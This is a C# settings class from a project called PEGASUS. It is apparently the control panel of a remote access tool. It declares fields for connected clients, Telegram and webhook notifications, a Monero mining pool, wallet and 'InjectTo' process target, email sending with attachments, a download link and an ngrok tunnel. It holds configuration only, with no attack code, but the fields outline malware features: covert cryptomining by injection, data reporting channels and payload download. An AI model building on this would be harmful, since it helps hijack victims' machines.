using PEGASUS.Diadyktio;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;

namespace PEGASUS
{
    public static class Settings
    {
        public static List<string> Blocked = new List<string>();
        public static object LockBlocked = new object();
        public static object LockReceivedSendValue = new object();

        public static string CertificatePath = Path.GetTempPath() + "\\PEGASUSCertificate.p12";
        public static X509Certificate2 PEGASUSCertificate;
        public static readonly string Version = versioning();
        internal static readonly object Default;
        public static object LockListviewClients = new object();
        public static object LockListviewLogs = new object();
        public static object LockListviewThumb = new object();
        public static bool ReportWindow = false;
        public static List<Clients> ReportWindowClients = new List<Clients>();
        public static object LockReportWindowClients = new object();
        public static string WebHook = Convert.ToString(Properties.Settings.Default.WebHook);
        public static string TelAPI = Convert.ToString(Properties.Settings.Default.TelAPI);
        public static string TelID = Convert.ToString(Properties.Settings.Default.TelID);
        public static string IP = "";
        public static string pool = Convert.ToString(Properties.Settings.Default.pool);
        public static string wallet = Convert.ToString(Properties.Settings.Default.wallet);
        public static string password = Convert.ToString(Properties.Settings.Default.password);
        public static string algo = Convert.ToString(Properties.Settings.Default.algo);
        public static string threads = Convert.ToString(Properties.Settings.Default.threads);
        public static string hook = Convert.ToString(Properties.Settings.Default.hook);
        public static string message = Convert.ToString(Properties.Settings.Default.message);
        public static string times = Convert.ToString(Properties.Settings.Default.times);

        public static long SentValue { get; set; }
        public static long ReceivedValue { get; set; }



        public static string versioning()
        {
            var assembly = Assembly.GetExecutingAssembly();
            var fileVersionInfo = FileVersionInfo.GetVersionInfo(assembly.Location);
            return fileVersionInfo.ProductVersion;
        }
    }

    public static class XmrSettings
    {
        public static string Pool = "";
        public static string Wallet = "";
        public static string Pass = "";
        public static string InjectTo = "";
        public static string Hash = "";
    }

    public static class EmlSettings
    {
        public static string fromEmail = "";
        public static string toEmail = "";
        public static string EmailPass = "";
        public static string EmailPort = "";
        public static string Host = "";
        public static string Subject = "";
        public static string Body = "";
        public static string Attachment = "";
    }

    public static class DowSettings
    {
        public static string downloadlink = "";
    }

    public static class NgrokSettings
    {
        public static string token = "";
        public static string port = "";
        public static string proto = "";

    }
}